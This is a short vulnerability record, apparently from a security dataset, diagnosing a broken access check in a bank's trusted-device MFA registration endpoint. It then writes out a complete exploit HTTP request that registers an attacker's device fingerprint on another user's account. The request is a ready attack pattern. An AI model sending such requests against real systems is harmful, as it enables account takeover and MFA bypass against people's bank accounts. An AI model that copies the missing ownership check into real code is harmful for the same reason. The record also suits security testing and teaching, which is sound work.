diagnosis: The trusted device registration endpoint adds deviceFingerprint to the trusted list of accountId supplied in the body. Because it never checks that the authenticated session corresponds to accountId, an attacker with access to a temporary MFA token or weak secret can register their own device fingerprint on another user's account, bypassing future MFA prompts.
exploit_request:
POST /api/devices/trust-mfa HTTP/1.1
Host: security.bank.internal:6007
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{
  "accountId": "acc_wealth_mgmt_7721",
  "deviceFingerprint": "fp_attacker_laptop_mac_001",
  "mfaToken": "918234"
}
